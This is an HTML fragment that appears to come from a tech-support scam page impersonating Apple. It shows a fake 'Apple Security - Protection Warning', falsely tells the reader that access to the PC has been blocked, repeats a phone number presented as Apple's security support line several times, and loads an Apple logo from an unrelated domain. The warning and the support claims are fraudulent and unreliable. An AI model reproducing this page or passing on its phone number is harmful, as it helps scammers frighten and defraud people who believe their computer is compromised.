...
margin-top: 8px; text-align: center;">Apple Security - Protection Warning</p>
               ...
               <p style="padding-bottom: 0px;">Call Apple Support <strong>+1-877-641-8333  (Security Support)</strong></p>
...
<div id="websa" class="websa mnwebs">
  ...
  <div id="disclaimer">
    Access to this PC has been blocked for security reasons.<br>
      <span class="support">Contact Apple Support: +1-877-641-8333  (Security Support)</span>
  </div>
  <div id="bottom">
  ...
  <div class="row">
      ...
      <div class="col-md-12">
          <div class="right-foot" style="text-align: center;">
              <span id="footertxt" style="font-weight: 700;"><img src="https://shaneebonnerecipe.com/monkey/apple.png"> Apple</span><span style="font-weight: 700;padding-left: 5px;color: #fff;">Support contact <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-877-641-8333  (Security Support)</span></span>
          </div>
      </div>
      <div class="col-md-12">
